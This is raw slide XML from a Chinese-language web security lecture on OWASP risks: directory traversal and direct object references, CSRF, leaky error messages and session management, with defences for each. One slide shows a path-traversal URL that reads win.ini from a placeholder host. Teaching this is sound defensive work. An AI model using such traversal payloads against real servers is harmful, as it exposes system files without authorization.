                </a:solidFill>
              </a:rPr>
              <a:t>目录遍历漏洞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Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>程序常常会暴露内部对象，包括：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>文件或目录</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>数据库口令</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>数据库的一些对象名称，比如表名</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>如果</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>访问控制</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>配置不合理，攻击者就可以不经授权地操作这些暴露的内部对象。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1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1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1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1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1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1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1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1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1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1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1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1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目录遍历攻击举例</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462852" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="1557338"/>
            <a:ext cx="8064500" cy="9556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http://www.acmehackme.com/online/getnews.asp?item=20March2007.html</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462853" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="3933825"/>
            <a:ext cx="8064500" cy="9556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http://www.acmehackme.com/online/getnews.asp?item=../../../../windows/win.ini</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462854" name="AutoShape 6"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4067175" y="2924175"/>
            <a:ext cx="431800" cy="719138"/>
          </a:xfrm>
          <a:prstGeom prst="downArrow">
            <a:avLst>
              <a:gd name="adj1" fmla="val 50000"/>
              <a:gd name="adj2" fmla="val 41636"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0000FF"/>
          </a:solidFill>
          <a:ln w="15875">
            <a:noFill/>
            <a:miter lim="800000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62855" name="AutoShape 7"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1042988" y="2997200"/>
            <a:ext cx="1800225" cy="784225"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val 16843"/>
              <a:gd name="adj2" fmla="val -119028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提交申请获取某个新闻网页文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1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</a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462856" name="AutoShape 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="468313" y="5445125"/>
            <a:ext cx="1800225" cy="784225"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -15963"/>
              <a:gd name="adj2" fmla="val -125102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使用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Batang" pitchFamily="18" charset="-127"/>
              </a:rPr>
              <a:t>../</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="16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从当前目录跳到上一级目录 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1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</a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="462857" name="AutoShape 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3492500" y="5373688"/>
            <a:ext cx="2735263" cy="935037"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeRectCallout">
            <a:avLst>
              <a:gd name="adj1" fmla="val -49185"/>
              <a:gd name="adj2" fmla="val -98727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目录遍历成功将读取到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windows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目录下的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win.ini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文件 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600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1600" b="1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46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46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46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46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46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2" grpId="0" animBg="1"/>
      <p:bldP spid="462853" grpId="0" animBg="1"/>
      <p:bldP spid="462854" grpId="0" animBg="1"/>
      <p:bldP spid="462855" grpId="0" animBg="1"/>
      <p:bldP spid="462856" grpId="0" animBg="1"/>
      <p:bldP spid="46285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防御不安全的直接对象引用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09700"/>
            <a:ext cx="8229600" cy="3562350"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>锁定</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>目录</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>。使得通过网络访问</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>服务器的用户都不能访问除专门用于存放</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>内容的目录以外的目录；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>对于每一次对象引用都要</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>重新验证授权</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>禁止通过参数暴露</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>内部对象；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>建议使用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>间接映射</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>的方法取代简单的直接对象引用，比如：</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="463876" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="971550" y="5254625"/>
            <a:ext cx="7315200" cy="466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0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>http://www.example.com/application?file=1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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4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（五）跨站请求仿冒</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4198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435975" cy="385603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A </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CSRF (Cross Site Request Forgery)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> attack forces a logged-on victim’s browser to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>send a pre-authenticated request</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t> to a vulnerable web application, which then forces the victim’s browser to perform a hostile action to the benefit of the attacker.  </a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="419845" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="496888" y="1254125"/>
            <a:ext cx="3763962" cy="579438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20000"/>
              </a:spcBef>
              <a:buFont typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP Definition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CSRF</a:t>
            </a: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>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>XSS</a:t>
            </a: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重大的差别：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>利用的是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>服务器端的漏洞</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>利用的是</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>客户端的漏洞</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻击是实施</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻击前的一个重要步骤：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻击者通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>攻击获取有用的攻击信息，比如通过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>伪造一个提示用户输入身份信息的表单。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4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4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4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4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4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4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4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4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4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4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防御</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>CSRF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>攻击</a:t>
            </a:r>
          </a:p>
        </p:txBody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1411288"/>
            <a:ext cx="7772400" cy="4114800"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>设定短暂的可信用户会话时间，完成任务后记得退出可信会话，删除所有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>每次提出一个可信行为时，对发出请求的用户进行验证；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>让网站记住登录用户名和密码时要小心。留在客户端的登录信息可能会攻击者加以利用；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>URL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>和表单中增加的每个请求，必须提供基本会话令牌以外的每个请求用户验证；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>从</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>应用程序中删除所有</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0"/>
              <a:t>漏洞。  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6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6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6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6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6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6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6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6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6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6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822325" y="149225"/>
            <a:ext cx="7308850" cy="792163"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" dirty="0"/>
              <a:t>（六）信息泄露和不当的错误处理 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="3600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4208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435975" cy="424973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en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Applications can unintentionally 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leak information</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t> about their configuration, internal workings, or violate privacy through a variety of application problems. Attackers use this weakness to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steal sensitive data or conduct more serious attacks</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>.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20869" name="Rectangle 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="544513" y="1311275"/>
            <a:ext cx="3763962" cy="579438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20000"/>
              </a:spcBef>
              <a:buFont typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" u="sng" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP Definition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0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信息泄露和不当的错误处理</a:t>
            </a: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敏感信息泄露常常细微难以察觉！</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>常见的脆弱点：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>堆栈跟踪信息</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>状态信息</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>登录失败信息</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>授权信息</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr lvl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7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7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7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7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7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7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7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不当的错误处理示例</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468996" name="Text Box 4"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="827088" y="1495425"/>
            <a:ext cx="7200900" cy="12001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lvl="1"/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Microsoft OLE DB Provider for ODBC Drivers error '80004005' </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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[Microsoft][ODBC Microsoft Access 97 Driver] Can't open database ‘VDPROD'.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468997" name="Text Box 5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="827088" y="3394075"/>
            <a:ext cx="7200900" cy="147478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lvl="1"/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java.sql.SQLException: ORA-00600: internal error code,     arguments: [ttcgnd-1], [0], [], [], [],</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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at oracle.jdbc.dbaccess.DBError.throwSqlException (DBError.java:169) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" b="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>at oracle.jdbc.ttc7.TTIoer.processError (TTIoer.java:208)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="468999" name="Text Box 7"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="147638" y="1308100"/>
            <a:ext cx="987425" cy="366713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示例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</a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="469000" name="Text Box 8"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="200025" y="2882900"/>
            <a:ext cx="981075" cy="366713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示例</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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</a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="469001" name="Text Box 9"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="900113" y="5300663"/>
            <a:ext cx="6911975" cy="822325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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>错误处理信息对于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Debug</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:srgbClr val="CC0000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>非常有用，但是为攻击者提供了太多潜在可用的攻击信息！</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1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8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8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9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9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9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9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6" grpId="0" animBg="1"/>
      <p:bldP spid="468997" grpId="0" animBg="1"/>
      <p:bldP spid="468999" grpId="0"/>
      <p:bldP spid="469000" grpId="0"/>
      <p:bldP spid="46900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防御信息泄露</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/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每个应用程序都应包含一个标准的错误处理框架来处理异常：禁止显示堆栈跟踪、数据库访问、协议等相关的信息；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>程序应只提供尽量简短、“刚好够用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>的错误处理信息给用户；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（七）认证和会话管理不完善</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4218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435975" cy="424973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en-US" altLang="zh-CN">
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Account credentials and session tokens are often not properly protected. Attackers compromise passwords, keys, or authentication tokens to assume other users’ identities.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468313" y="1168400"/>
            <a:ext cx="3763962" cy="579438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20000"/>
              </a:spcBef>
              <a:buFont typeface="Webdings" panose="05030102010509060703" pitchFamily="18" charset="2"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3200" b="1" u="sng">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>OWASP Definition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1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会话</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(Session)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>管理</a:t>
            </a:r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338" y="1439862"/>
            <a:ext cx="7772400" cy="4865687"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>HTTP/HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>是“无状态”协议</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>意味着每一次用户请求都需要认证</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>会话管理解决了这样的问题：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>当一个用户得到服务器认证后，服务器如何识别和处理这个认证用户接下来的请求</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>程序一般会提供内置的会话跟踪方法，方便用户的使用；</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>开发者常采用自己的策略来实现会话状态管理，可能会犯错误而导致安全问题。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2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2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会话管理：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Session ID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203825"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>唯一地标识用户</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>一个</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>ID</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>仅用于一次认证会话</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>由服务器生成</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>以如下的形式发送给客户端：</a:t>
            </a:r>
          </a:p>
          <a:p>
